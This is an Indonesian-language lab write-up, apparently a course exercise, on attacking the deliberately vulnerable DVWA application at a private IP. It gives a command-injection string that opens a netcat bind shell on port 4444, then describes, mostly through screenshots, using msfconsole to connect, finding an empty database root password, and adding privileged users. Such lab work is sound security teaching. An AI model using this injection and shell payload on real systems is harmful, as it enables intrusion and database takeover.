# DVWA | Lesson 4
## Konfigurasi

Alamat target DVWA `http://10.151.34.170`

## Skenario

Login ke DVWA

Masuk ke menu Command Execution

Masukkan string berikut pada form
```
192.168.1.106; mkfifo /tmp/pipe; sh /tmp/pipe | nc -lp 4444 > /tmp/pipe
```

Berbeda dengan yang terdapat pada tutorial, pada VM exploitable ini perlu ditambahi perintah `-p` diikuti dengan `4444` pada `nc` agar port dapat terbuka.

Selanjutnya masuk ke Backtrack dan jalankan program msfconsole pada terminal
```
# msfconsole
```
![alt text](./l4-bt1.png)

Masukkan perintah seperti berikut, beserta IP dari target, yaitu `10.151.34.170`.

![alt text](./l4-bt2.png)

Setelah itu jalankan perintah `exploit` pada msfconsole.

![alt text](./l4-bt3.png)

Ternyata user yang menjalankan php yaitu `www-data`.

![alt text](./l4-bt4.png)

Proses apache2 dijalankan oleh user `www-data` dan direktori dvwa terdapat pada `/var/www/dvwa`.

![alt text](./l4-bt5.png)

User dari database adalah `root` dan passwordnya tidak ada alias string kosong.

![alt text](./l4-bt6.png)

Selanjutnya eksploitasi database dvwa.

![alt text](./l4-bt7.png)

Menambahkan user.

![alt text](./l4-bt8.png)

Eksplorasi table.

![alt text](./l4-bt9.png)

Membuat user dengan privileges baru.

## Hasil

![alt text](./l4-bt10.png)
